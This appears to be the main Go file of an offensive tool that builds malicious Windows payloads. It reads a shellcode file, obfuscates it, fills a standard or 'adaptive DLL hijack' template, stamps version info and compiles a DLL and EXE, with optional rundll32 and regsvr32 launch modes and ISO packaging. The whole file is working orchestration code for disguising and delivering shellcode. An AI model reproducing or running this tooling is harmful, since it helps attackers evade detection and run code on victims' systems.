package main

import (
	"errors"
	"log"
	"os"
	"os/exec"
	"path/filepath"
)

func checkError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func main() {
	var (
		cmd []string
		err error
	)

	printLogo()

	// Check if Go is installed
	if _, err = exec.LookPath("go"); err != nil {
		log.Fatal("[!] Go is not installed or not in PATH, please install " +
			"and/or add it to your PATH")
	}

	// Check if shellcode file exists
	if _, err = os.Stat(flags.shellcodeFile); os.IsNotExist(err) {
		log.Fatal("[!] Shellcode file does not exist")
	}

	flags.shellcodeFile, err = filepath.Abs(flags.shellcodeFile)
	if err != nil {
		log.Fatal("[!] Failed to resolve shellcode file path: ", err)
	}
	log.Printf("[+] Shellcode file: %s", flags.shellcodeFile)
	log.Printf("[+] Output DLL:     %s", flags.outputDll)
	log.Printf("[+] Output EXE:     %s", flags.outputExe)

	if flags.adaptHijackDll != "" {
		log.Printf(
			"[+] Mode:           adaptive DLL hijack (%s)",
			flags.adaptHijackDll,
		)
	} else {
		log.Println("[+] Mode:           standard")
	}

	if flags.exportFunc != "" {
		log.Printf("[+] rundll32:       enabled (export: %s)", flags.exportFunc)
	}

	if flags.regSvr32 {
		log.Println("[+] regsvr32:       enabled")
	}

	if flags.outputIsoFile != "" {
		log.Printf("[+] ISO:            %s", flags.outputIsoFile)
	}

	// Check if goversioninfo is installed
	if _, err = exec.LookPath("goversioninfo"); err != nil {
		log.Println("[-] goversioninfo is not installed, installing it now...")
		cmd = []string{
			"go",
			"install",
			"github.com/josephspurrier/goversioninfo/cmd/goversioninfo@latest",
		}
		if _, err = runShellCommand(cmd); err != nil {
			log.Fatal("[!] Failed to install goversioninfo: " + err.Error())
		}
		log.Println("[+] goversioninfo installed successfully")
	}

	if flags.adaptHijackDll != "" {
		if _, err = os.Stat(flags.adaptHijackDll); os.IsNotExist(err) {
			log.Fatalf(
				"[!] Hijack DLL file %s does not exist",
				flags.adaptHijackDll,
			)
		}
		generateAdaptiveDLLTemplate()
	} else {
		generateStandardDLLTemplate()
	}

	err = generateVersioninfo()
	checkError(err)

	err = scObfuscator(flags.shellcodeFile)
	checkError(err)

	err = compileAll()
	checkError(err)

	log.Println("[+] WOOOOOO, have a nice day!")
}

func runShellCommand(command []string) (string, error) {
	var (
		cmd    *exec.Cmd
		err    error
		output []byte
	)

	if len(command) == 0 {
		return "", errors.New("no command provided")
	}

	cmd = exec.Command(command[0], command[1:]...)
	output, err = cmd.CombinedOutput()
	return string(output), err
}
